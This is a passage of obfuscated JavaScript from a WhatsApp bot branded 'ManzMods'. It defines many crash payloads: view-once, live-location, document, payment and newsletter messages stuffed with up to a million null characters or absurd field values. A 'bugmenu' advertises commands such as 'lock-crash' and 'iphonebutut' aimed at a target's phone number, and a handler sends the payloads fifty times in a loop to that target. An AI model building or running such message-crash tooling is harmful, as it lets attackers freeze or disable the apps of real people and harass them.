          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p244,
        quoted: p245
      });
      await p154.relayMessage(p244, vGenerateWAMessageFromContent52.message, {
        participant: {
          jid: p244
        },
        messageId: vGenerateWAMessageFromContent52.key.id
      });
    }
    async function f89(p246) {
      let vGenerateWAMessageFromContent53 = generateWAMessageFromContent(p246, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            scheduledCallCreationMessage: {
              scheduledTimestampMs: Date.now(),
              callType: 2,
              title: ""
            }
          }
        }
      }), {
        userJid: p246
      });
      await p154.relayMessage(p246, vGenerateWAMessageFromContent53.message, {});
    }
    async function f90(p247) {
      await p154.relayMessage(p247, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬🐉" + "\0".repeat(900000)
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {});
      let v215 = fs.readFileSync("./all/image/XY.webp");
      await p154.sendMessage(p247, {
        sticker: v215
      }, {
        quoted: v217
      });
    }
    async function f91(p248, p249) {
      var vGenerateWAMessageFromContent54 = generateWAMessageFromContent(p248, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "x",
              degreesLongitude: "x",
              caption: "🩸⃟༑⌁⃰𝐌𝐚𝐧𝐳 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\0",
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p248,
        quoted: p249
      });
      await p154.relayMessage(p248, vGenerateWAMessageFromContent54.message, {
        messageId: vGenerateWAMessageFromContent54.key.id
      });
    }
    async function f92(p250, p251) {
      var vGenerateWAMessageFromContent55 = generateWAMessageFromContent(p250, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "🍷꙰͜͡𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬💸" + "\0".repeat(900000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p250,
        quoted: p251
      });
      await p154.relayMessage(p250, vGenerateWAMessageFromContent55.message, {
        participant: {
          jid: p250
        },
        messageId: vGenerateWAMessageFromContent55.key.id
      });
    }
    async function f93(p252, p253) {
      var vGenerateWAMessageFromContent56 = generateWAMessageFromContent(p252, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "🔥፝⃟ ꙳𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬🔥፝⃟" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: p252,
        quoted: p253
      });
      await p154.relayMessage(p252, vGenerateWAMessageFromContent56.message, {
        participant: {
          jid: p252
        },
        messageId: vGenerateWAMessageFromContent56.key.id
      });
    }
    async function f94(p254, p255) {
      var vGenerateWAMessageFromContent57 = generateWAMessageFromContent(p254, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p254,
        quoted: p255
      });
      await p154.relayMessage(p254, vGenerateWAMessageFromContent57.message, {
        participant: {
          jid: p254
        },
        messageId: vGenerateWAMessageFromContent57.key.id
      });
    }
    async function f95(p256, p257) {
      var vGenerateWAMessageFromContent58 = generateWAMessageFromContent(p256, proto.Message.fromObject({
        interactiveMessage: {
          header: {
            title: "🩸⃟༑⌁⃰𝐌𝐚𝐧𝐳 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
              }
            }, {
              upload: ryozingod.waUploadToServer
            }))
          },
          body: {
            text: ""
          },
          footer: {
            text: "› ©ManzMods!!"
          },
          nativeFlowMessage: {
            messageParamsJson: "\0".repeat(1000000)
          }
        }
      }), {
        userJid: p256,
        quoted: p257
      });
      await ryozingod.relayMessage(p256, vGenerateWAMessageFromContent58.message, {
        participant: {
          jid: p256
        },
        messageId: vGenerateWAMessageFromContent58.key.id
      });
    }
    const v216 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const v217 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p155.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        listResponseMessage: {
          title: "𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬🐉"
        }
      }
    };
    async function f96(p258, p259, p260, p261, p262, p263, p264, p265) {
      var vGenerateWAMessageFromContent59 = generateWAMessageFromContent(p258, proto.Message.fromObject({
        qp: {
          filter: {
            filterName: p259,
            parameters: p260,
            filterResult: p261,
            clientNotSupportedConfig: p262
          },
          filterClause: {
            clauseType: p263,
            clauses: p264,
            filters: p265
          }
        }
      }), {
        userJid: p258
      });
      await p154.relayMessage(p258, vGenerateWAMessageFromContent59.message, {
        participant: {
          jid: p258
        },
        messageId: vGenerateWAMessageFromContent59.key.id
      });
    }
    async function f97(p266, p267, p268, p269, p270, p271, p272, p273, p274, p275, p276, p277, p278, p279) {
      var vGenerateWAMessageFromContent60 = generateWAMessageFromContent(p266, proto.Message.fromObject({
        sessionStructure: {
          sessionVersion: p267,
          localIdentityPublic: p268,
          remoteIdentityPublic: p269,
          rootKey: p270,
          previousCounter: p271,
          senderChain: p272,
          receiverChains: p273,
          pendingKeyExchange: p274,
          pendingPreKey: p275,
          remoteRegistrationId: p276,
          localRegistrationId: p277,
          needsRefresh: p278,
          aliceBaseKey: p279
        }
      }), {
        userJid: p266
      });
      await p154.relayMessage(p266, vGenerateWAMessageFromContent60.message, {
        participant: {
          jid: p266
        },
        messageId: vGenerateWAMessageFromContent60.key.id
      });
    }
    const v218 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function f98(p280) {
      var vGenerateWAMessageFromContent61 = generateWAMessageFromContent(p280, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x109ed2 + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      p154.relayMessage(p280, vGenerateWAMessageFromContent61.message, {
        messageId: vGenerateWAMessageFromContent61.key.id
      });
    }
    async function f99(p281) {
      var vGenerateWAMessageFromContent62 = generateWAMessageFromContent(p281, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363334353222571@newsletter",
              newsletterName: "Manz Script" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Channel Manz Script",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: p281
      });
      await p154.relayMessage(p281, vGenerateWAMessageFromContent62.message, {
        participant: {
          jid: p281
        },
        messageId: vGenerateWAMessageFromContent62.key.id
      });
    }
    const v219 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p155.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./all/image/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐌𝐚𝐧𝐳 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const v220 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(p155.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./all/image/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐌𝐚𝐧𝐳 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    let v221 = [];
    for (let v222 of v194) {
      v221.push({
        displayName: await p154.getName(v222 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await p154.getName(v222 + "@s.whatsapp.net")) + "\n\nFN:" + (await p154.getName(v222 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + v222 + ":" + v222 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: mewing@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6g44\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function f100(p282) {
      return "```" + p282 + "```";
    }
    function f101(p283) {
      var v223 = "";
      var v224 = p283.toString().split("").reverse().join("");
      for (var v225 = 0; v225 < v224.length; v225++) {
        if (v225 % 3 == 0) {
          v223 += v224.substr(v225, 3) + ".";
        }
      }
      return "" + v223.split("", v223.length - 1).reverse().join("");
    }
    try {
      ppuser = await p154.profilePictureUrl(p155.sender, "image");
    } catch (_0x37dbbc) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function f102(p284) {
      const v226 = new _0x37823c();
      return v226.deobfuscateSource(p284);
    }
    async function f103(p285) {
      return new Promise((p286, p287) => {
        try {
          const v227 = javascriptObfuscator2.obfuscate(p285, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const v228 = {
            status: 200,
            author: "ManzModz",
            result: v227.getObfuscatedCode()
          };
          p286(v228);
        } catch (_0x3013e0) {
          p287(_0x3013e0);
        }
      });
    }
    if (!p154.public) {
      if (!p155.key.fromMe) {
        return;
      }
    }
    async function f104() {
      var v229 = ["••", "•••", "••••", "•••••", "••••", "•••", "••", "𝐌𝐞𝐧𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬"];
      let {
        key: _0x3d7ebc
      } = await p154.sendMessage(v122, {
        text: " 𝐋𝐨𝐝𝐢𝐧𝐠 𝐌𝐚𝐧𝐳𝐌𝐨𝐝𝐬"
      });
      for (let v230 = 0; v230 < v229.length; v230++) {
        await p154.sendMessage(v122, {
          text: v229[v230],
          edit: _0x3d7ebc
        });
      }
    }
    const v231 = await reSize(ppuser, 300, 300);
    const vF7 = async (p288, p289, p290, p291, p292, p293, p294, p295, p296) => {
      const vGenerateWAMessageFromContent63 = generateWAMessageFromContent(p288, proto.Message.fromObject({
        orderMessage: {
          orderId: p290,
          thumbnail: p291,
          itemCount: p292,
          status: "INQUIRY",
          surface: "CATALOG",
          orderTitle: p293,
          message: p289,
          sellerJid: p294,
          token: p295,
          totalAmount1000: p296,
          totalCurrencyCode: "IDR"
        }
      }), {
        userJid: p288,
        quoted: p155
      });
      p154.relayMessage(p288, vGenerateWAMessageFromContent63.message, {
        messageId: vGenerateWAMessageFromContent63.key.id
      });
    };
    const vF8 = p297 => {
      p154.sendMessage(p155.chat, {
        text: p297,
        contextInfo: {
          mentionedJid: [v136],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "𝐌𝐚𝐧𝐳",
            body: "" + namabot,
            previewType: "PHOTO",
            thumbnailUrl: "",
            thumbnail: fs.readFileSync("./all/image/Manz.jpg"),
            sourceUrl: "" + isLink
          }
        }
      }, {
        quoted: p155
      });
    };
    const v232 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(v122 ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        contactMessage: {
          displayName: "" + v138,
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + v138 + ",\nitem1.TEL;waid=" + v136.split("@")[0] + ":" + v136.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://img0.pixhost.to/images/898/531137436_skyzopedia.jpg"
          }
        }
      }
    };
    function f105(p298 = "") {
      return [...p298.matchAll(/@([0-9]{5,16}|0)/g)].map(p299 => p299[1] + "@s.whatsapp.net");
    }
    if (p155.isGroup && !p155.key.fromMe && !v197 && antilink) {
      if (!v145) {
        return;
      }
      if (v125.match("whatsapp.com")) {
        p154.sendMessage(p155.chat, {
          text: "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + v140.subject
        }, {
          quoted: p155
        });
        p154.groupParticipantsUpdate(p155.chat, [v136], "delete");
        p154.sendMessage(p155.chat, {
          delete: p155.key
        });
      }
    }
    switch (v128) {
      case "menu":
        {
          await f104();
          let v233 = "" + imageurl;
          async function f106(p300) {
            const {
              imageMessage: _0xee2dad
            } = await generateWAMessageContent({
              image: {
                url: p300
              }
            }, {
              upload: p154.waUploadToServer
            });
            return _0xee2dad;
          }
          let vGenerateWAMessageFromContent64 = generateWAMessageFromContent(p155.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `Halo Saya Adalah \`${global.namabot}\``
                  },
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await f106(v233),
                        hasMediaAttachment: true
                      },
                      body: {
                        text:` 
𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
⿻🎭Dev Name : ${global.namaCreator}
⿻🎭Bot Name : ${global.namabot}
⿻🎭Version : ${global.versisc}
                        
𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨
⿻ ${global.xmenu} bugmenu
⿻ ${global.xmenu} ownermenu`
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await f106(v233),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: `
Thanks To
© Manzx Julxian ( Developer )
⿻🎭Andra ( Best Friend )
⿻🎭Andra ( Old Friend )
⿻🎭FOXXED ( Team )
© *Manzx Julxianx*`
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await p154.relayMessage(vGenerateWAMessageFromContent64.key.remoteJid, vGenerateWAMessageFromContent64.message, {
            messageId: vGenerateWAMessageFromContent64.key.id
          });
        }
        break;
      case "bugmenu":
        {
          await f104();
          let v234 = "" + imageurl;
          async function f107(p301) {
            const {
              imageMessage: _0x4297cc
            } = await generateWAMessageContent({
              image: {
                url: p301
              }
            }, {
              upload: p154.waUploadToServer
            });
            return _0x4297cc;
          }
          let vGenerateWAMessageFromContent65 = generateWAMessageFromContent(p155.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `Halo Saya Adalah \`${global.namabot}\``
                  },
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await f107(v234),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: `
𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
⿻🎭Dev Name : ${global.namaCreator}
⿻🎭Bot Name : ${global.namabot}
⿻🎭Version : ${global.versisc}
                        
𝗕𝗘𝗦𝗧 𝗗𝗨𝗔𝗟 𝗖𝗢𝗠𝗕𝗢 𝗕𝗨𝗚
                        
⿻ ${global.xmenu} lock-crash 62xx
⿻ ${global.xmenu} manzkil-mark 62xx
⿻ ${global.xmenu} intimidate 62xx
                        
𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗢𝗥𝗜 𝗙𝗜𝗫𝗫𝗘𝗗 𝗩𝟭
                        
⿻ ${global.xmenu} ori-hancur 62xx
⿻ ${global.xmenu} matot-ganas 62xx
⿻ ${global.xmenu} xian-bugfixxed 62xx
⿻ ${global.xmenu} xiaw-frezeex 62xx
⿻ ${global.xmenu} julxian-comboxz 62xx
                        
𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗕𝗘𝗧𝗔 𝗙𝗜𝗫𝗫𝗘𝗗
                        
⿻ ${global.xmenu} manzx-vulberaritas 62xx
⿻ ${global.xmenu} executive 62xx
⿻ ${global.xmenu} domination 62xx
⿻ ${global.xmenu} beta-crash 62xx
⿻ ${global.xmenu} fixxed-beta 62xzx
                        
𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗨𝗜 𝗦𝗜𝗦𝗧𝗘M
                        
⿻ ${global.xmenu} crash-ui 62xx
⿻ ${global.xmenu} system-ui 62xx
⿻ ${global.xmenu} lock-uisistem 62xx
                        `
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await f107(v234),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: `
𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗘𝗠𝗢𝗝𝗜
                        
⿻ ${global.xmenu} 🔥 62xx
⿻ ${global.xmenu} 🌷 62xx
⿻ ${global.xmenu} ☠️ 62xx
⿻ ${global.xmenu} 🌹 62xx
⿻ ${global.xmenu} 🥶 62xx
                        
𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗜𝗢𝗦 𝗕𝗔𝗣𝗨𝗞
                        
⿻ ${global.xmenu} manzxdev 62xx
⿻ ${global.xmenu} os 62xx
⿻ ${global.xmenu} iphonebutut 62xxx
⿻ ${global.xmenu} manz-ios 62xxx
⿻ ${global.xmenu} iossepele 62xxx
                        
𝗕𝗨𝗚𝗜𝗡 𝗖𝗢𝗡𝗩𝗘𝗥𝗩𝗜𝗦𝗜𝗢𝗡𝗫
                        
⿻ ${global.xmenu} cvvxbeta-fixxed 62xxx
⿻ ${global.xmenu} convervisionx-rowr 62xxx
⿻ ${global.xmenu} manzxjulx-cvvx 62xxx
⿻ ${global.xmenu} julxian-xxx 62xxx
⿻ ${global.xmenu} xiawmeong-cvvx
                      
𝗕𝗨𝗚 𝗭𝗢𝗨𝗫𝗜𝗢𝗡𝗫
                        
⿻ ${global.xmenu} crashui 62xxx
⿻ ${global.xmenu} crashv1 62xxx
⿻ ${global.xmenu} crash v2 62xxx
⿻ ${global.xmenu} serangui 62xxx
⿻ ${global.xmenu} crash-zfx 62xxx
⿻ ${global.xmenu} zxxcrash 62xxx
                        
*Thanks To*
© Manzx Julxian ( Developer )
⿻🎭Andra ( Best Friend )
⿻🎭Andra ( Old Friend )
⿻🎭FOXXED ( Team )
© *Manzx Julxianx*`
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await p154.relayMessage(vGenerateWAMessageFromContent65.key.remoteJid, vGenerateWAMessageFromContent65.message, {
            messageId: vGenerateWAMessageFromContent65.key.id
          });
        }
        break;
      case "ownermenu":
        {
          await f104();
          let v235 = "" + imageurl;
          async function f108(p302) {
            const {
              imageMessage: _0x57a313
            } = await generateWAMessageContent({
              image: {
                url: p302
              }
            }, {
              upload: p154.waUploadToServer
            });
            return _0x57a313;
          }
          let vGenerateWAMessageFromContent66 = generateWAMessageFromContent(p155.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `Halo Saya Adalah \`${global.namabot}\``
                  },
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await f108(v235),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: `
𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
⿻🎭Dev Name : ${global.namaCreator}
⿻🎭Bot Name : ${global.namabot}
⿻🎭Version : ${global.versisc}
                        
𝐎𝐖𝐍𝐄𝐑

⿻ ${global.xmenu} owner
⿻ ${global.xmenu} addowne
⿻ ${global.xmenu} addprem
⿻ ${global.xmenu} delowner
⿻ ${global.xmenu} delprem
⿻ ${global.xmenu} public
⿻ ${global.xmenu} self
                        `
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await f108(v235),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: `
Thanks To
© Manzx Julxian ( Developer )
⿻🎭Andra ( Best Friend )
⿻🎭Andra ( Old Friend )
⿻🎭FOXXED ( Team )
© *Manzx Julxianx*`
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/" + owner + "\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await p154.relayMessage(vGenerateWAMessageFromContent66.key.remoteJid, vGenerateWAMessageFromContent66.message, {
            messageId: vGenerateWAMessageFromContent66.key.id
          });
        }
        break;
      case "lock-crash":
      case "manzkil-mark":
      case "intimidate":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v236 = 0; v236 < 50; v236++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          f96(target, v218);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
